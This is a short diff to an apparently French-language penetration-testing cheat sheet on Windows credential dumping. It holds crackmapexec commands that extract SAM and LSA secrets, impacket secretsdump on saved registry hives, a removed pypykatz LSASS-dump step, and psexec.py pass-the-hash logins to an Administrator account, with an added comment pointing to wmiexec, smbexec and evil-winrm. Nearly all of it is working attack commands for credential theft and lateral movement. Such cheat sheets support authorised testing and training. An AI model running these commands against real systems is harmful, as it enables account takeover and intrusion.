@@ -13,7 +13,6 @@ reg save hklm\security security.save
 ## A distance 
 
 ```
-crackmapexec smb $TARGET_IP --local-auth -u $LOCAL_USER -p $LOCAL_PASS --lsa
 crackmapexec smb $TARGET_IP --local-auth -u $LOCAL_USER -p $LOCAL_PASS --sam
 ```
 
@@ -24,10 +23,6 @@ crackmapexec smb $TARGET_IP --local-auth -u $LOCAL_USER -p $LOCAL_PASS --sam
 secretdump.py local -sam sam.save -security security.save -system system.save LOCAL
 ```
 
-### Dump LSASS
-```
-pypykatz lsa minidump /home/peter/Documents/lsass.dmp
-```
 
 ## Utilisation des Hash LM:NT
 ### Accès distant
@@ -35,6 +30,7 @@ pypykatz lsa minidump /home/peter/Documents/lsass.dmp
 psexec.py Administratur@$TARGET_IP -hashes xxxxxxxxxxxxxxxxx:xxxxxxxxxxxxxxxxxxxxxxx
 # ou
 psexec.py Administratur@$TARGET_IP -hashes :xxxxxxxxxxxxxxxxxxxxxxx
+# on peut également utiliser wmiexec.py et smbexec.py ou encore evil-winrm
 ```
 
 ### Cassage des hashs avec hashcat
